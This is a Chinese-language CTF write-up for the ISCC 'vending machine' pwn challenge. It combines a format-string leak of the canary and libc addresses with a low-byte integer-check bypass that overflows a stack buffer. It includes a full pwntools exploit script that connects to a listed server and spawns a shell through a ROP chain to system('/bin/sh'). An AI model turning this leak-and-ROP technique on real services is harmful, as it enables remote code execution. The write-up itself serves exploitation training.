# Vending Machine PWN 题解

## 题目信息

- **题目来源**: ISCC CTF
- **连接地址**: 39.96.193.120:33334
- **附件**: pwn_vending

## 题目描述

> 你要用一台限量输入售货机购买物品，你需要在有限的输入内买到自己想要的物品。售货机中有一件商品是你想要的重要文件，但是由于售货机的限制，你无法输入获取文件所需要的指令。请你想办法绕过限制，成功拿到想要的文件。

## 环境信息

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

## 程序功能分析

程序是一个售货机系统，有以下交互流程：

```
--- vending machine ---
Please enter your customer ID:        # 输入客户ID
Welcome, {输入内容}
The item is limited to three per customer, please enter the quantity you need:  # 输入数量(限制≤3)
Please enter the name of the product you need:  # 输入商品名称
Order confirmed!
```

`main()` 函数循环调用 `vuln()` 三次，每次都是完整的一次购买流程。

## 漏洞分析

### 漏洞点1: 格式化字符串漏洞

在 `vuln()` 函数中：

```c
printf(customer_id);  // 直接将用户输入作为格式化字符串
```

用户输入的 customer ID 直接传入 `printf`，存在格式化字符串漏洞，可以泄露栈上的敏感信息。

### 漏洞点2: 整数截断绕过数量限制

```c
scanf("%u", &quantity);  // 读取数量到 unsigned int (32位)

if (quantity <= 3) {    // 检查数量是否≤3
    read(0, name_buffer, quantity);  // 注意：这里是 quantity，不是 qty
}
```

变量布局（假设 `qty` 在 `[rbp-0x134]`，`name` 在 `[rbp-0x110]`）：

```
[rbp-0x134] qty (4 bytes)
[rbp-0x130] ... (padding)
[rbp-0x110] name buffer (256 bytes)
[rbp-8]     canary (8 bytes)
```

问题在于：`scanf("%u", &qty)` 读取一个 unsigned int（32位），但检查只用了 `cmp al, 3`（仅检查最低字节）。

输入 **512 (0x200)**：
- `0x200 & 0xFF = 0x00 ≤ 3` ✓ 检查通过
- 但 `read(0, buf, 0x200) = 512` 字节，远超 256 字节缓冲区！

## Exploit 思路

1. **第1轮**：利用格式化字符串泄露 canary 和 puts@GOT，计算 libc 基址
2. **第2轮**：利用整数截断漏洞，输入数量=512，触发栈溢出，执行 ROP 链调用 `system("/bin/sh")`

## 漏洞利用过程

### Step 1: 信息泄露

发送格式化字符串 `%45$p.%10$s` 配合 puts@GOT 地址：

- `%45$p` → 泄露栈上的 canary
- `%10$s` → 将 puts@GOT 指向的地址内容作为字符串输出

```
Welcome, 0x43b43439d1cf4b00. \xe4\xab\xa8\x8f\x7fAAAAA...
         ↑canary                    ↑puts地址 (小端序)
```

### Step 2: 计算 libc 地址

通过 pwntools libcdb 查询 puts 低12位 `0x420`，确认为 **libc6_2.31-0ubuntu9.x_amd64**：

```
puts:      0x84420
system:    0x52290
/bin/sh:   0x1b45bd
```

### Step 3: 构造 ROP 链

栈布局：
```
[buffer: 256 bytes 'A']
[canary: 8 bytes]        ← 泄露得到
[saved rbp: 8 bytes]     ← 填充为0
[ret addr: 8 bytes]      ← pop_rdi_gadget
[pop_rdi: 8 bytes]       ← 0x4014a3
[/bin/sh addr: 8 bytes]  ← libc_base + 0x1b45bd
[system addr: 8 bytes]   ← libc_base + 0x52290
```

ROP Gadget：
- `pop rdi; ret` = 0x4014a3
- `ret` (栈对齐) = 0x40101a

### Step 4: 完整利用脚本

```python
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

e = ELF('pwn_vending')

pop_rdi = 0x4014a3
ret = 0x40101a

# libc6_2.31-0ubuntu9.x_amd64 offsets
puts_offset = 0x84420
system_offset = 0x52290
binsh_offset = 0x1b45bd

r = remote('39.96.193.120', 33334)
r.recvuntil(b':')

# === 第1轮：泄露 canary 和 puts 地址 ===
payload1 = b'%45$p.%10$s' + b'A' * 5 + p64(e.got['puts'])
r.sendline(payload1)

data = r.recvuntil(b':', timeout=10)
for line in data.split(b'\n'):
    if b'Welcome' in line:
        welcome_part = line.split(b'Welcome, ')[1]
        dot_idx = welcome_part.find(b'.')
        canary = int(welcome_part[:dot_idx], 16)

        rest = welcome_part[dot_idx+1:]
        a_idx = rest.find(b'AAAAA')
        puts_addr = u64(rest[:a_idx].ljust(8, b'\x00'))

print(f"Canary: {hex(canary)}")
print(f"puts: {hex(puts_addr)}")

# 计算 libc 基址
libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

# === 第1轮：正常输入数量和名称 ===
r.sendline(b'1')       # 数量=1
r.recvuntil(b':')
r.send(b'A')           # 名称

# === 第2轮：触发栈溢出 ===
r.recvuntil(b':')
r.sendline(b'AAAA')    # ID

r.recvuntil(b':')
r.sendline(b'512')     # 数量=512，绕过检查！

r.recvuntil(b':')

# 构造溢出 payload
overflow = b'A' * 264                # 填满缓冲区
overflow += p64(canary)              # canary
overflow += p64(0)                    # saved rbp
overflow += p64(ret)                  # 栈对齐
overflow += p64(pop_rdi)              # pop rdi; ret
overflow += p64(binsh_addr)           # /bin/sh
overflow += p64(system_addr)           # system

r.send(overflow)

# 获取 shell
import time
time.sleep(1)
r.sendline(b'cat /flag*')
time.sleep(1)
print(r.recv(timeout=5).decode())

r.close()
```

## 成功截图

```
Canary: 0x43b43439d1cf4b00
puts: 0x7f886b1ff420
Libc base: 0x7f886b17b000
system: 0x7f886b1cd290
/bin/sh: 0x7f886b32f5bd
Overflow length: 312

flag: ISCC{374ec3cd-aa7d-4c09-adab-4feb273ec0c1}
```

## 总结

本题考察了两个漏洞的组合利用：

1. **格式化字符串漏洞**：泄露 canary 和 libc 地址
2. **整数截断漏洞**：`cmp al, 3` 只检查最低字节，但 `read()` 使用完整32位值，实现缓冲区溢出

利用的关键是观察到虽然有数量限制检查，但利用的是 `read()` 的长度参数而非直接写入的长度，使得超长输入成为可能。

**Flag**: `ISCC{374ec3cd-aa7d-4c09-adab-4feb273ec0c1}`
